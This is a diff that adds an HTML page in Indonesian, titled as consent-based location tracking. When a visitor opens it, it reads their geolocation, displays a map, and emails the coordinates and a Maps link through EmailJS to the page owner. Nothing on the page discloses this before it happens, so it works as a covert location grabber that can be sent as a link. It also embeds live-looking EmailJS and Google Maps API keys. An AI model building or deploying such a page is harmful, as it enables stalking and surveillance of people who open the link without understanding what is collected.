@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pelacakan Lokasi dengan Persetujuan</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("cAb0AGroYTyRl1j6L"); // Ganti dengan Public Key dari EmailJS
+        })();
+    </script>
+    <style>
+        #map {
+            height: 300px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    
+    <div id="map"></div>
+
+    <script>
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation tidak didukung di browser ini.");
+            }
+        }
+
+        // Fungsi untuk mengirim lokasi
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Tampilkan peta
+            const map = new google.maps.Map(document.getElementById('map'), {
+                zoom: 15,
+                center: { lat: latitude, lng: longitude }
+            });
+
+            new google.maps.Marker({
+                position: { lat: latitude, lng: longitude },
+                map: map,
+                title: "Lokasi Anda"
+            });
+
+            // Kirim data lokasi via EmailJS
+            emailjs.send("service_0yajl7n", "template_tuq53ta", {
+                latitude: latitude,
+                longitude: longitude,
+                map_link: `https://www.google.com/maps?q=${latitude},${longitude}`
+            })
+            .then(function(response) {
+                alert("Lokasi berhasil dikirim ke email.");
+            }, function(error) {
+                alert("Gagal mengirim lokasi. Error: " + error);
+            });
+        }
+
+        // Fungsi untuk menangani error
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Izin lokasi ditolak.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Permintaan lokasi melebihi waktu batas.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan tidak dikenal.");
+                    break;
+            }
+        }
+
+        // Panggil fungsi getLocation() secara otomatis saat halaman dimuat
+        window.onload = getLocation;
+    </script>
+
+    <!-- Ganti YOUR_API_KEY dengan API Key Google Maps -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBJ_XlxltqRMHEaqUxKak6LkIb0jt4qRWM"></script>
+</body>
+</html>
